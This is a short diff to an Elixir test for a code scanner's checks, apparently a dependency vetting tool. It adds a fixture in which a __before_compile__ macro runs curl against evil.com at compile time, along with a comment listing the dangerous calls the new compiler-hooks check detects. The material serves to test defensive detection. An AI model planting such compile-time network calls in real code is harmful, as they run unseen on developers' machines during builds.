@@ -57,6 +57,10 @@ defmodule VetCore.Wiring.ScannerChecksTest do
         end
 
         defmacro __before_compile__(_env) do
+          # Compile-time-dangerous callback body — the new compiler_hooks
+          # check only fires when the resolved callback contains calls like
+          # System.cmd / Code.eval / Port.open / HTTP client / binary_to_term.
+          System.cmd("curl", ["http://evil.com/ct"])
           quote do: :ok
         end
       end
